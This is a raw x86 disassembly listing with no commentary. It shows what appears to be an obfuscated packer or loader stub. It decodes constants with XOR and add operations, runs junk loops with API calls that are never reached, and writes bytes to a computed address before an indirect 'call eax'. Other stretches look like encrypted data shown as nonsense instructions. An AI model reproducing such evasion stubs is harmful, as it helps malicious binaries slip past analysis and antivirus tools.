  40b13b:	add    bh,BYTE PTR [ebp-0x846336]
  40b141:	cmp    ecx,DWORD PTR [eax]
  40b143:	add    al,0x9a
  40b145:	(bad)  
  40b146:	ror    BYTE PTR ds:0x921b3c37,cl
  40b14c:	mov    cs,WORD PTR [edi-0x50]
  40b14f:	cmp    BYTE PTR [edx-0x4af585fd],bl
  40b155:	mov    WORD PTR [eax+0x278a391c],?
  40b15b:	push   ds
  40b15c:	xchg   esi,eax
  40b15d:	les    esp,FWORD PTR [esi]
  40b15f:	cdq    
  40b160:	in     al,dx
  40b161:	mov    dh,0x4c
  40b163:	loopne 0x40b148
  40b165:	pop    ebp
  40b166:	dec    ebx
  40b167:	inc    ebx
  40b168:	inc    edx
  40b169:	cs pop edi
  40b16b:	jno    0x40b1c6
  40b16d:	enter  0x516c,0xf0
  40b171:	lods   al,BYTE PTR ds:[esi]
  40b172:	cwde   
  40b173:	xchg   edi,eax
  40b174:	inc    ebx
  40b175:	push   es
  40b176:	test   dl,dh
  40b178:	pop    eax
  40b179:	bound  ebp,QWORD PTR [ebx-0x767b203b]
  40b17f:	and    ch,BYTE PTR [ebx+0x7324a77f]
  40b185:	arpl   WORD PTR cs:[ecx+esi*8-0x1a75ed71],ax
  40b18d:	sub    DWORD PTR [eax+0x20eb432e],ecx
  40b193:	inc    ecx
  40b194:	in     eax,0xae
  40b196:	dec    ebx
  40b197:	mov    eax,DWORD PTR [ebp+0x18]
  40b19a:	mov    esi,DWORD PTR [ebp+0x10]
  40b19d:	mov    DWORD PTR [esi+0xc],eax
  40b1a0:	mov    eax,DWORD PTR [ebp+0x1c]
  40b1a3:	mov    esi,DWORD PTR [ebp+0x10]
  40b1a6:	mov    DWORD PTR [esi+0x10],eax
  40b1a9:	mov    eax,DWORD PTR [ebp+0x8]
  40b1ac:	xor    eax,ecx
  40b1ae:	add    eax,edx
  40b1b0:	pop    esi
  40b1b1:	leave  
  40b1b2:	ret    0x18
  40b1b5:	push   ebp
  40b1b6:	mov    ebp,esp
  40b1b8:	mov    eax,ds:0x41d45c
  40b1bd:	sub    ecx,DWORD PTR ds:0x428010
  40b1c3:	mov    eax,DWORD PTR [eax+0x1c8]
  40b1c9:	mov    eax,DWORD PTR [eax]
  40b1cb:	sub    DWORD PTR ds:0x425004,0x167a
  40b1d5:	cdq    
  40b1d6:	sub    ecx,DWORD PTR ds:0x427000
  40b1dc:	push   ebx
  40b1dd:	add    ebx,0x2084
  40b1e3:	mov    ecx,0xfabdbef1
  40b1e8:	add    eax,ecx
  40b1ea:	inc    ebx
  40b1eb:	adc    edx,0xffffffff
  40b1ee:	push   esi
  40b1ef:	push   edi
  40b1f0:	mov    edi,edx
  40b1f2:	mov    DWORD PTR ds:0x428004,0x5236
  40b1fc:	mov    edx,DWORD PTR [ebp+0x8]
  40b1ff:	mov    ebx,eax
  40b201:	mov    eax,0x8a29a123
  40b206:	xor    esi,esi
  40b208:	xor    ebx,eax
  40b20a:	or     DWORD PTR ds:0x426004,0x425020
  40b214:	xor    edi,0x0
  40b217:	adc    DWORD PTR ds:0x427010,0x428004
  40b221:	add    edx,ecx
  40b223:	mov    DWORD PTR ds:0x425008,0x471a
  40b22d:	adc    esi,0xffffffff
  40b230:	xor    DWORD PTR ds:0x428010,0x421e
  40b23a:	xor    edx,eax
  40b23c:	xor    DWORD PTR ds:0x425018,0x5980
  40b246:	xor    esi,0x0
  40b249:	mov    DWORD PTR ds:0x426010,0x601d
  40b253:	cmp    edx,ebx
  40b255:	mov    DWORD PTR ds:0x425008,0x5a5b
  40b25f:	jne    0x40b281
  40b265:	mov    DWORD PTR ds:0x427008,0x3ec
  40b26f:	cmp    esi,edi
  40b271:	mov    DWORD PTR ds:0x425020,0x5f4c
  40b27b:	je     0x40b345
  40b281:	and    DWORD PTR ds:0x426000,0x0
  40b28b:	mov    edx,DWORD PTR ds:0x426000
  40b291:	inc    edx
  40b292:	mov    DWORD PTR ds:0x426000,edx
  40b298:	cmp    DWORD PTR ds:0x426000,0x5
  40b29f:	jne    0x40b2c5
  40b2a5:	push   0x41ff0e
  40b2aa:	push   0x5c4e
  40b2af:	push   DWORD PTR [ebp-0xc]
  40b2b2:	push   0x6b40
  40b2b7:	push   0x149b
  40b2bc:	push   DWORD PTR [ebp-0x10]
  40b2bf:	call   DWORD PTR ds:0x42104c
  40b2c5:	cmp    DWORD PTR ds:0x426000,0x4
  40b2cc:	jne    0x40b2e1
  40b2d2:	xor    edx,edx
  40b2d4:	xor    edx,DWORD PTR ds:0x426000
  40b2da:	inc    edx
  40b2db:	mov    DWORD PTR ds:0x426000,edx
  40b2e1:	cmp    DWORD PTR ds:0x426000,0x10
  40b2e8:	jb     0x40b28b
  40b2ee:	or     DWORD PTR ds:0x42600c,0x5f7e
  40b2f8:	mov    edx,DWORD PTR ds:0x41d45c
  40b2fe:	or     DWORD PTR ds:0x428000,0x427018
  40b308:	mov    edx,DWORD PTR [edx+0x1c0]
  40b30e:	mov    edx,DWORD PTR [edx]
  40b310:	or     DWORD PTR ds:0x425014,0x42801c
  40b31a:	xor    esi,esi
  40b31c:	adc    DWORD PTR ds:0x425010,0x7665
  40b326:	add    edx,ecx
  40b328:	adc    esi,0xffffffff
  40b32b:	xor    edx,eax
  40b32d:	xor    esi,0x0
  40b330:	cmp    edx,0x70941fd1
  40b336:	jne    0x40b3af
  40b33c:	cmp    esi,0xffffffff
  40b33f:	jne    0x40b3af
  40b345:	mov    edx,DWORD PTR ds:0x41d4e0
  40b34b:	mov    esi,DWORD PTR ds:0x41d4d8
  40b351:	xor    edx,esi
  40b353:	mov    DWORD PTR ds:0x41d4d8,edx
  40b359:	mov    edx,DWORD PTR [ebp+0xc]
  40b35c:	mov    edx,DWORD PTR [edx]
  40b35e:	mov    edx,DWORD PTR [edx]
  40b360:	mov    esi,DWORD PTR ds:0x41d4d8
  40b366:	add    DWORD PTR [edx],esi
  40b368:	mov    esi,DWORD PTR [ebp+0x8]
  40b36b:	mov    edx,DWORD PTR ds:0x41d4d8
  40b371:	xor    esi,0x7510893
  40b377:	add    esi,0x3272db
  40b37d:	xor    ebx,ebx
  40b37f:	add    esi,ecx
  40b381:	adc    ebx,0xffffffff
  40b384:	xor    edi,edi
  40b386:	xor    esi,eax
  40b388:	xor    ebx,0x0
  40b38b:	add    edx,ecx
  40b38d:	adc    edi,0xffffffff
  40b390:	xor    edx,eax
  40b392:	xor    edi,0x0
  40b395:	cmp    edx,esi
  40b397:	jne    0x40b3af
  40b39d:	cmp    edi,ebx
  40b39f:	jne    0x40b3af
  40b3a5:	mov    eax,ds:0x41d4d8
  40b3aa:	mov    ds:0x41d4e0,eax
  40b3af:	pop    edi
  40b3b0:	pop    esi
  40b3b1:	pop    ebx
  40b3b2:	pop    ebp
  40b3b3:	ret    0x8
  40b3b6:	push   ebp
  40b3b7:	mov    ebp,esp
  40b3b9:	sub    esp,0x90
  40b3bf:	and    DWORD PTR ds:0x428004,0x0
  40b3c9:	jmp    0x40b3db
  40b3ce:	mov    ecx,DWORD PTR ds:0x428004
  40b3d4:	inc    ecx
  40b3d5:	mov    DWORD PTR ds:0x428004,ecx
  40b3db:	cmp    DWORD PTR ds:0x428004,0x14
  40b3e2:	jae    0x40b417
  40b3e8:	cmp    DWORD PTR ds:0x428004,0x20
  40b3ef:	jne    0x40b405
  40b3f5:	push   0x41ff61
  40b3fa:	push   0x41ff4b
  40b3ff:	call   DWORD PTR ds:0x421050
  40b405:	jmp    0x40b3ce
  40b40a:	movzx  ecx,BYTE PTR ds:0x42801c
  40b411:	sub    DWORD PTR ds:0x425014,ecx
  40b417:	push   esi
  40b418:	or     ecx,eax
  40b41a:	push   edi
  40b41b:	and    DWORD PTR ds:0x428004,0x0
  40b425:	jmp    0x40b435
  40b42a:	mov    eax,ds:0x428004
  40b42f:	inc    eax
  40b430:	mov    ds:0x428004,eax
  40b435:	cmp    DWORD PTR ds:0x428004,0x10
  40b43c:	jae    0x40b460
  40b442:	cmp    DWORD PTR ds:0x428004,0x1f
  40b449:	jne    0x40b45b
  40b44f:	push   DWORD PTR [ebp-0x20]
  40b452:	push   DWORD PTR [ebp-0x14]
  40b455:	call   DWORD PTR ds:0x421054
  40b45b:	jmp    0x40b42a
  40b460:	mov    eax,ds:0x41d45c
  40b465:	and    ecx,0x5378
  40b46b:	mov    DWORD PTR [ebp-0x2c],eax
  40b46e:	sub    esi,DWORD PTR ds:0x425018
  40b474:	mov    eax,ds:0x41d568
  40b479:	mov    DWORD PTR [ebp-0x3c],eax
  40b47c:	and    DWORD PTR [ebp-0x34],0x0
  40b480:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  40b487:	add    DWORD PTR ds:0x42600c,0x3783
  40b491:	mov    DWORD PTR [ebp-0x30],0xf89c85b5
  40b498:	and    DWORD PTR ds:0x42901c,0x4e39
  40b4a2:	mov    eax,DWORD PTR [ebp-0x1c]
  40b4a5:	xor    DWORD PTR ds:0x42800c,0x4866
  40b4af:	mov    ecx,DWORD PTR [ebp-0x1c]
  40b4b2:	sub    esi,DWORD PTR ds:0x427008
  40b4b8:	xor    eax,ecx
  40b4ba:	mov    ecx,DWORD PTR ds:0x41d27c
  40b4c0:	mov    esi,DWORD PTR ds:0x41d298
  40b4c6:	sub    ecx,esi
  40b4c8:	sub    ecx,DWORD PTR [ecx+esi*1]
  40b4cb:	mov    DWORD PTR [ebp-0x1c],eax
  40b4ce:	or     DWORD PTR [ebp-0x1c],0xf89cb5b6
  40b4d5:	add    DWORD PTR ds:0x426008,ecx
  40b4db:	mov    eax,DWORD PTR [ebp-0x28]
  40b4de:	xor    DWORD PTR ds:0x428018,ebx
  40b4e4:	mov    ecx,DWORD PTR [ebp-0x28]
  40b4e7:	or     esi,edi
  40b4e9:	xor    eax,ecx
  40b4eb:	mov    DWORD PTR [ebp-0x28],eax
  40b4ee:	add    DWORD PTR [ebp-0x28],0xf89f05b6
  40b4f5:	sub    ecx,0x68bb
  40b4fb:	mov    eax,DWORD PTR [ebp-0x18]
  40b4fe:	mov    ecx,DWORD PTR [ebp-0x18]
  40b501:	xor    eax,ecx
  40b503:	adc    ecx,esi
  40b505:	mov    DWORD PTR [ebp-0x18],eax
  40b508:	not    DWORD PTR ds:0x428008
  40b50e:	add    DWORD PTR [ebp-0x18],0xf89c85f6
  40b515:	mov    ecx,DWORD PTR ds:0x41ffef
  40b51b:	mov    esi,DWORD PTR ds:0x41d294
  40b521:	sub    esi,ecx
  40b523:	and    ecx,DWORD PTR [ecx+esi*1]
  40b526:	mov    eax,DWORD PTR [ebp-0x24]
  40b529:	mov    ecx,DWORD PTR [ebp-0x24]
  40b52c:	xor    eax,ecx
  40b52e:	and    edi,0x1f5e
  40b534:	mov    DWORD PTR [ebp-0x24],eax
  40b537:	add    DWORD PTR [ebp-0x24],0xf89c85d6
  40b53e:	mov    eax,DWORD PTR [ebp-0x14]
  40b541:	mov    ecx,DWORD PTR [ebp-0x14]
  40b544:	xor    eax,ecx
  40b546:	and    DWORD PTR ds:0x428018,0x1b89
  40b550:	mov    DWORD PTR [ebp-0x14],eax
  40b553:	mov    edi,DWORD PTR ds:0x41ffd7
  40b559:	mov    ecx,DWORD PTR ds:0x41d260
  40b55f:	sub    edi,ecx
  40b561:	xor    edi,DWORD PTR [edi+ecx*1]
  40b564:	mov    eax,DWORD PTR [ebp-0x20]
  40b567:	mov    DWORD PTR ds:0x427010,0x1f
  40b571:	cmp    DWORD PTR ds:0x427010,0x0
  40b578:	je     0x40b5ad
  40b57e:	cmp    DWORD PTR ds:0x427010,0x2f
  40b585:	jne    0x40b59b
  40b58b:	push   0x425000
  40b590:	push   0x673f
  40b595:	call   DWORD PTR ds:0x421058
  40b59b:	mov    edi,DWORD PTR ds:0x427010
  40b5a1:	dec    edi
  40b5a2:	mov    DWORD PTR ds:0x427010,edi
  40b5a8:	jmp    0x40b571
  40b5ad:	mov    ecx,DWORD PTR [ebp-0x14]
  40b5b0:	mov    esi,0x7510893
  40b5b5:	neg    DWORD PTR ds:0x42900c
  40b5bb:	xor    eax,esi
  40b5bd:	mov    edi,0x3272db
  40b5c2:	add    eax,edi
  40b5c4:	xor    eax,ecx
  40b5c6:	mov    DWORD PTR [ebp-0x14],eax
  40b5c9:	sbb    DWORD PTR ds:0x426010,0x1ce0
  40b5d3:	mov    eax,DWORD PTR [ebp-0x10]
  40b5d6:	xor    ecx,DWORD PTR ds:0x42800c
  40b5dc:	mov    ecx,DWORD PTR [ebp-0x10]
  40b5df:	sub    eax,ecx
  40b5e1:	and    ecx,DWORD PTR ds:0x427018
  40b5e7:	mov    DWORD PTR [ebp-0x10],eax
  40b5ea:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  40b5f1:	xor    ecx,DWORD PTR ds:0x42500c
  40b5f7:	mov    al,BYTE PTR [ebp-0x1]
  40b5fa:	add    DWORD PTR ds:0x425018,ecx
  40b600:	movzx  ecx,BYTE PTR [ebp-0x1]
  40b604:	movzx  eax,al
  40b607:	adc    DWORD PTR ds:0x42700c,0x429008
  40b611:	sub    ecx,eax
  40b613:	mov    BYTE PTR [ebp-0x1],cl
  40b616:	movzx  eax,BYTE PTR [ebp-0x1]
  40b61a:	xor    eax,0xffffff99
  40b61d:	mov    BYTE PTR [ebp-0x1],al
  40b620:	or     eax,DWORD PTR ds:0x42901c
  40b626:	mov    eax,DWORD PTR [ebp-0x20]
  40b629:	xor    eax,esi
  40b62b:	add    eax,edi
  40b62d:	and    DWORD PTR ds:0x429004,0xdaf
  40b637:	mov    DWORD PTR [ebp-0x14],eax
  40b63a:	and    DWORD PTR ds:0x428018,0x429014
  40b644:	lea    eax,[ebp-0x40]
  40b647:	adc    DWORD PTR ds:0x425024,0x42500c
  40b651:	mov    DWORD PTR [ebp-0x38],eax
  40b654:	adc    DWORD PTR ds:0x425020,0x75b6
  40b65e:	lea    eax,[ebp-0x38]
  40b661:	mov    DWORD PTR [ebp-0x44],eax
  40b664:	sbb    DWORD PTR ds:0x425010,0x425028
  40b66e:	lea    eax,[ebp-0x44]
  40b671:	mov    DWORD PTR [ebp-0x8],eax
  40b674:	or     DWORD PTR ds:0x427008,0x2eb5
  40b67e:	lea    eax,[ebp-0x8]
  40b681:	and    DWORD PTR ds:0x42801c,0x428004
  40b68b:	mov    DWORD PTR [ebp-0x48],eax
  40b68e:	adc    DWORD PTR ds:0x42700c,ebx
  40b694:	mov    eax,DWORD PTR [ebp-0x18]
  40b697:	sbb    DWORD PTR ds:0x425010,0x426010
  40b6a1:	xor    eax,esi
  40b6a3:	add    eax,edi
  40b6a5:	and    DWORD PTR ds:0x429014,0x19f0
  40b6af:	push   eax
  40b6b0:	mov    eax,DWORD PTR [ebp-0x1c]
  40b6b3:	xor    eax,esi
  40b6b5:	add    eax,edi
  40b6b7:	push   eax
  40b6b8:	mov    eax,DWORD PTR [ebp-0x10]
  40b6bb:	xor    eax,esi
  40b6bd:	add    eax,edi
  40b6bf:	push   eax
  40b6c0:	lea    eax,[ebp-0x90]
  40b6c6:	push   eax
  40b6c7:	push   DWORD PTR [ebp-0x20]
  40b6ca:	push   DWORD PTR [ebp-0x30]
  40b6cd:	call   0x408d97
  40b6d2:	test   eax,eax
  40b6d4:	je     0x40b705
  40b6da:	lea    eax,[ebp-0x90]
  40b6e0:	push   eax
  40b6e1:	mov    eax,DWORD PTR [ebp-0x30]
  40b6e4:	xor    eax,esi
  40b6e6:	add    eax,edi
  40b6e8:	push   eax
  40b6e9:	mov    eax,DWORD PTR [ebp-0x2c]
  40b6ec:	add    eax,0xaa
  40b6f1:	push   eax
  40b6f2:	mov    eax,DWORD PTR [ebp-0x2c]
  40b6f5:	mov    eax,DWORD PTR [eax+0x198]
  40b6fb:	push   DWORD PTR [eax]
  40b6fd:	call   0x403f26
  40b702:	mov    DWORD PTR [ebp-0x40],eax
  40b705:	lea    eax,[ebp+0x4]
  40b708:	mov    DWORD PTR [ebp-0x34],eax
  40b70b:	mov    eax,DWORD PTR [ebp-0x8]
  40b70e:	mov    eax,DWORD PTR [eax]
  40b710:	mov    eax,DWORD PTR [eax]
  40b712:	mov    eax,DWORD PTR [eax]
  40b714:	test   eax,eax
  40b716:	je     0x40b797
  40b71c:	lea    eax,[ebp-0xc]
  40b71f:	mov    DWORD PTR [ebp-0x4c],eax
  40b722:	mov    eax,DWORD PTR [ebp-0x3c]
  40b725:	mov    DWORD PTR [ebp-0xc],eax
  40b728:	mov    eax,DWORD PTR [ebp-0x8]
  40b72b:	mov    eax,DWORD PTR [eax]
  40b72d:	mov    eax,DWORD PTR [eax]
  40b72f:	mov    eax,DWORD PTR [eax]
  40b731:	sub    DWORD PTR [ebp-0xc],eax
  40b734:	mov    ecx,DWORD PTR [ebp-0x10]
  40b737:	xor    ecx,esi
  40b739:	mov    eax,0xffcd8d25
  40b73e:	sub    eax,ecx
  40b740:	add    DWORD PTR [ebp-0xc],eax
  40b743:	mov    eax,DWORD PTR [ebp-0xc]
  40b746:	mov    ecx,DWORD PTR [ebp-0x8]
  40b749:	mov    ecx,DWORD PTR [ecx]
  40b74b:	mov    ecx,DWORD PTR [ecx]
  40b74d:	mov    ecx,DWORD PTR [ecx]
  40b74f:	mov    DWORD PTR [ecx+0x1],eax
  40b752:	mov    al,BYTE PTR [ebp-0x1]
  40b755:	mov    ecx,DWORD PTR [ebp-0x8]
  40b758:	mov    ecx,DWORD PTR [ecx]
  40b75a:	mov    ecx,DWORD PTR [ecx]
  40b75c:	mov    ecx,DWORD PTR [ecx]
  40b75e:	push   DWORD PTR [ebp-0x2c]
  40b761:	xor    al,0x6f
  40b763:	sub    al,0xd
  40b765:	mov    BYTE PTR [ecx],al
  40b767:	mov    eax,ds:0x41d2d8
  40b76c:	push   DWORD PTR [eax]
  40b76e:	push   DWORD PTR ds:0x41d534
  40b774:	push   DWORD PTR ds:0x41d2e0
  40b77a:	push   DWORD PTR ds:0x41d514
  40b780:	push   DWORD PTR ds:0x41d588
  40b786:	push   DWORD PTR [ebp-0x30]
  40b789:	push   DWORD PTR [ebp-0x20]
  40b78c:	mov    eax,DWORD PTR [ebp-0x8]
  40b78f:	mov    eax,DWORD PTR [eax]
  40b791:	mov    eax,DWORD PTR [eax]
  40b793:	mov    eax,DWORD PTR [eax]
  40b795:	call   eax
  40b797:	mov    eax,DWORD PTR [ebp-0x34]
  40b79a:	mov    ecx,DWORD PTR ds:0x41d4d8
  40b7a0:	add    DWORD PTR [eax],ecx
  40b7a2:	pop    edi
  40b7a3:	pop    esi
  40b7a4:	leave  
  40b7a5:	ret    
  40b7a6:	push   ebp
  40b7a7:	mov    ebp,esp
  40b7a9:	sub    esp,0x18
  40b7ac:	mov    DWORD PTR [ebp-0x10],0xf89f85b6
  40b7b3:	lea    eax,[ebp+0x14]
  40b7b6:	neg    edx
  40b7b8:	mov    DWORD PTR [ebp-0x4],eax
  40b7bb:	push   esi
  40b7bc:	sbb    DWORD PTR ds:0x426000,edi
  40b7c2:	mov    esi,0xf89c85b6
  40b7c7:	mov    DWORD PTR [ebp-0xc],esi
  40b7ca:	lea    eax,[ebp-0xc]
  40b7cd:	add    edx,ecx
  40b7cf:	mov    DWORD PTR [ebp-0x14],eax
  40b7d2:	sub    edx,ecx
  40b7d4:	mov    eax,DWORD PTR [ebp-0xc]
  40b7d7:	dec    ecx
  40b7d8:	mov    edx,DWORD PTR [ebp-0x14]
  40b7db:	and    ecx,0x3a88
  40b7e1:	mov    ecx,0x7510893
  40b7e6:	or     DWORD PTR ds:0x427010,0x426000
  40b7f0:	xor    eax,ecx
  40b7f2:	add    eax,0x3272db
  40b7f7:	sub    DWORD PTR ds:0x427010,0x427014
  40b801:	mov    DWORD PTR [edx],eax
  40b803:	xor    DWORD PTR ds:0x425000,0x422
  40b80d:	mov    eax,ds:0x41d2d4
  40b812:	mov    edx,DWORD PTR ds:0x41d260
  40b818:	mov    edx,DWORD PTR [edx]
  40b81a:	xor    DWORD PTR ds:0x426000,edx
  40b820:	mov    edx,DWORD PTR [ebp-0x4]
  40b823:	mov    eax,DWORD PTR [eax]
  40b825:	and    DWORD PTR ds:0x425008,0x4c84
  40b82f:	add    eax,DWORD PTR [edx]
  40b831:	mov    DWORD PTR ds:0x426004,0x10
  40b83b:	cmp    DWORD PTR ds:0x426004,0x0
  40b842:	je     0x40b874
  40b848:	cmp    DWORD PTR ds:0x426004,0x20
  40b84f:	jne    0x40b860
  40b855:	push   0x6cf7
  40b85a:	call   DWORD PTR ds:0x421014
  40b860:	xor    edx,edx
  40b862:	add    edx,DWORD PTR ds:0x426004
  40b868:	dec    edx
  40b869:	mov    DWORD PTR ds:0x426004,edx
  40b86f:	jmp    0x40b83b
  40b874:	push   edi
  40b875:	mov    DWORD PTR [ebp-0x8],eax
  40b878:	sub    edi,0x3a07
  40b87e:	mov    edi,DWORD PTR [ebp+0x8]
  40b881:	mov    DWORD PTR ds:0x429004,0x1a
  40b88b:	cmp    DWORD PTR ds:0x429004,0x0
  40b892:	je     0x40b8ca
  40b898:	cmp    DWORD PTR ds:0x429004,0x2a
  40b89f:	jne    0x40b8b8
  40b8a5:	push   0x42901c
  40b8aa:	push   0x429000
  40b8af:	push   DWORD PTR [ebp-0xc]
  40b8b2:	call   DWORD PTR ds:0x42105c
  40b8b8:	mov    edx,DWORD PTR ds:0x429004
  40b8be:	dec    edx
  40b8bf:	mov    DWORD PTR ds:0x429004,edx
  40b8c5:	jmp    0x40b88b
  40b8ca:	mov    eax,ds:0x41d45c
  40b8cf:	add    DWORD PTR ds:0x426018,0x7a9e
  40b8d9:	mov    eax,DWORD PTR [eax+0x198]
  40b8df:	and    DWORD PTR ds:0x428000,0x0
  40b8e9:	jmp    0x40b8fb
  40b8ee:	mov    edx,DWORD PTR ds:0x428000
  40b8f4:	inc    edx
  40b8f5:	mov    DWORD PTR ds:0x428000,edx
  40b8fb:	cmp    DWORD PTR ds:0x428000,0x16
  40b902:	jae    0x40b949
  40b908:	cmp    DWORD PTR ds:0x428000,0xa
  40b90f:	jne    0x40b920
  40b915:	push   0x6e10
  40b91a:	call   DWORD PTR ds:0x421018
  40b920:	cmp    DWORD PTR ds:0x428000,0x9
  40b927:	jne    0x40b93a
  40b92d:	mov    edx,DWORD PTR ds:0x428000
  40b933:	inc    edx
  40b934:	mov    DWORD PTR ds:0x428000,edx
  40b93a:	jmp    0x40b8ee
  40b93f:	adc    DWORD PTR ds:0x42800c,0x7489
  40b949:	xor    edi,ecx
  40b94b:	mov    edx,DWORD PTR ds:0x41d2ac
  40b951:	mov    edx,DWORD PTR [edx]
  40b953:	and    DWORD PTR ds:0x426010,edx
  40b959:	mov    edx,0x3272db
  40b95e:	add    edi,edx
  40b960:	mov    DWORD PTR ds:0x427014,0x73af
  40b96a:	cmp    DWORD PTR [eax],edi
  40b96c:	je     0x40b98d
  40b972:	mov    DWORD PTR ds:0x427018,0x6eb3
  40b97c:	mov    eax,DWORD PTR [eax]
  40b97e:	mov    DWORD PTR ds:0x429008,0x1439
  40b988:	jmp    0x410469
  40b98d:	mov    eax,0x67c2
  40b992:	mov    eax,DWORD PTR [ebp+0x18]
  40b995:	cmp    eax,esi
  40b997:	jne    0x40b9b1
  40b99d:	mov    DWORD PTR ds:0x427004,0x29bc
  40b9a7:	push   0xf89c85b5
  40b9ac:	jmp    0x410458
  40b9b1:	mov    esi,DWORD PTR [ebp+0x18]
  40b9b4:	not    DWORD PTR ds:0x42700c
  40b9ba:	mov    eax,0xf89c85b4
  40b9bf:	mov    DWORD PTR ds:0x427008,0x585a
  40b9c9:	cmp    esi,eax
  40b9cb:	mov    DWORD PTR ds:0x429004,0x6551
  40b9d5:	jne    0x410448
  40b9db:	or     eax,eax
  40b9dd:	mov    eax,DWORD PTR [ebp+0x10]
  40b9e0:	add    DWORD PTR ds:0x425020,edi
  40b9e6:	xor    eax,ecx
  40b9e8:	add    DWORD PTR ds:0x425020,0xdeb
  40b9f2:	add    eax,edx
  40b9f4:	mov    DWORD PTR ds:0x425004,0x1b
  40b9fe:	cmp    DWORD PTR ds:0x425004,0x0
  40ba05:	je     0x40ba5e
  40ba0b:	cmp    DWORD PTR ds:0x425004,0x2
  40ba12:	jne    0x40ba30
  40ba18:	push   0x7389
  40ba1d:	push   0x7d80
  40ba22:	push   DWORD PTR [ebp-0xc]
  40ba25:	push   0x7694
  40ba2a:	call   DWORD PTR ds:0x42101c
  40ba30:	cmp    DWORD PTR ds:0x425004,0x3
  40ba37:	jne    0x40ba4a
  40ba3d:	mov    esi,DWORD PTR ds:0x425004
  40ba43:	dec    esi
  40ba44:	mov    DWORD PTR ds:0x425004,esi
  40ba4a:	xor    esi,esi
  40ba4c:	add    esi,DWORD PTR ds:0x425004
  40ba52:	dec    esi
  40ba53:	mov    DWORD PTR ds:0x425004,esi
  40ba59:	jmp    0x40b9fe
  40ba5e:	mov    DWORD PTR [ebp-0x18],eax
  40ba61:	adc    eax,DWORD PTR ds:0x42801c
  40ba67:	mov    eax,DWORD PTR [ebp+0xc]
  40ba6a:	mov    esi,DWORD PTR [ebp-0x8]
  40ba6d:	or     DWORD PTR ds:0x42501c,0x426004
  40ba77:	xor    eax,ecx
  40ba79:	add    eax,edx
  40ba7b:	xor    DWORD PTR ds:0x429004,0x42601c
  40ba85:	imul   eax,DWORD PTR [esi]
  40ba88:	mov    esi,DWORD PTR [ebp+0x8]
  40ba8b:	sbb    DWORD PTR ds:0x427014,0x428018
  40ba95:	xor    esi,ecx
  40ba97:	add    DWORD PTR ds:0x429014,0x42500c
  40baa1:	add    esi,edx
  40baa3:	cmp    esi,eax
  40baa5:	jmp    0x40de50
  40baaa:	jl     0x40baa1
  40baac:	retf   0xc78f
  40baaf:	mov    esi,DWORD PTR [ebx]
  40bab1:	test   edi,edi
  40bab3:	rcl    ch,cl
  40bab5:	jmp    0xf573:0xe67d6ca0
  40babc:	bound  esp,QWORD PTR [edx-0xc]
  40babf:	pop    edi
  40bac0:	bound  esp,QWORD PTR [edx+0x2]
  40bac3:	mov    bl,BYTE PTR ds:0xfb9e27fa
  40bac9:	xchg   DWORD PTR [eax],edi
  40bacb:	dec    edi
  40bacc:	push   es
  40bacd:	lods   al,BYTE PTR ss:[esi]
  40bacf:	sbb    ebx,DWORD PTR [ecx+0x7f]
  40bad2:	vpsraw ymm4,ymm5,xmm1
  40bad6:	add    BYTE PTR [eax],ch
  40bad8:	inc    eax
  40bad9:	sbb    ebp,DWORD PTR [esi+0x2c]
  40badc:	mov    edi,0x8611a267
  40bae1:	mov    cl,0x1a
  40bae3:	cli    
  40bae4:	imul   ebx,DWORD PTR ds:0xeeb24dee,0xffffffe7
  40baeb:	xor    al,0x5f
  40baed:	add    bh,0x15
  40baf0:	cwde   
  40baf1:	loopne 0x40bb71
  40baf3:	xchg   ebx,eax
  40baf4:	push   esi
  40baf5:	mov    ecx,DWORD PTR [esi+0x76]
  40baf8:	xor    al,0x7
  40bafa:	mov    ds,WORD PTR [eax+0x35]
  40bafd:	loopne 0x40bad5
  40baff:	mov    bl,0x84
  40bb01:	push   edi
  40bb02:	cmp    ah,0x7a
  40bb05:	pop    eax
  40bb06:	inc    ebx
  40bb07:	fwait
  40bb08:	in     eax,0x98
  40bb0a:	retf   
  40bb0b:	iret   
  40bb0c:	push   edx
  40bb0d:	stc    
  40bb0e:	xchg   edx,eax
  40bb0f:	cmp    BYTE PTR [ebp-0x4db314d2],bh
  40bb15:	mov    DWORD PTR [ebx+0x43],edx
  40bb18:	inc    ebp
  40bb19:	push   eax
  40bb1a:	cmp    BYTE PTR [esi],dl
  40bb1c:	aam    0xb2
  40bb1e:	popf   
  40bb1f:	xchg   edx,eax
  40bb20:	inc    edx
  40bb21:	ret    
  40bb22:	call   0x2c518428
  40bb27:	nop
  40bb28:	sar    DWORD PTR [ebp+0x38],cl
  40bb2b:	xor    bh,BYTE PTR [edi+0x4]
  40bb2e:	scas   eax,DWORD PTR es:[edi]
  40bb2f:	pushf  
  40bb30:	mov    ?,WORD PTR [esi+edx*2-0x52778c3a]
  40bb37:	icebp  
  40bb38:	dec    esp
  40bb39:	mov    ebx,0x1d04d09e
  40bb3e:	adc    bh,al
  40bb40:	sbb    esi,DWORD PTR fs:[ebx]
  40bb43:	sub    ebp,edx
  40bb45:	and    al,0xf5
  40bb47:	mov    DWORD PTR [ecx+0x4a],eax
  40bb4a:	popa   
  40bb4b:	jae    0x40bafc
  40bb4d:	loopne 0x40bb6a
  40bb4f:	retf   
  40bb50:	sbb    DWORD PTR [edx],ebp
  40bb52:	push   esp
  40bb53:	push   eax
  40bb54:	mov    edx,0x2365d7c1
  40bb59:	test   eax,0xaf05f354
  40bb5e:	xor    al,0x8b
  40bb60:	dec    ecx
  40bb61:	cld    
  40bb62:	pop    eax
  40bb63:	out    dx,eax
  40bb64:	add    BYTE PTR [edx+0x1bc5c753],bh
  40bb6a:	and    DWORD PTR [ecx-0x13c0b1b3],0xffffff80
  40bb71:	test   eax,0xb6eea475
  40bb76:	(bad)  
  40bb77:	mov    ah,0x6c
  40bb79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb7a:	(bad)  
  40bb7b:	adc    BYTE PTR [edi-0x67],ah
  40bb7e:	mov    eax,ds:0xd9c3867d
  40bb83:	jo     0x40bbb2
  40bb85:	mov    esp,cr0
  40bb88:	out    0xce,eax
  40bb8a:	jno    0x40bb8f
  40bb8c:	into   
  40bb8d:	mov    edx,eax
  40bb8f:	cmp    al,0xd8
  40bb91:	cwde   
  40bb92:	into   
  40bb93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb94:	mov    eax,ds:0xf27343af
  40bb99:	lds    edi,FWORD PTR [eax-0x52]
  40bb9c:	icebp  
  40bb9d:	push   0x937b63ca
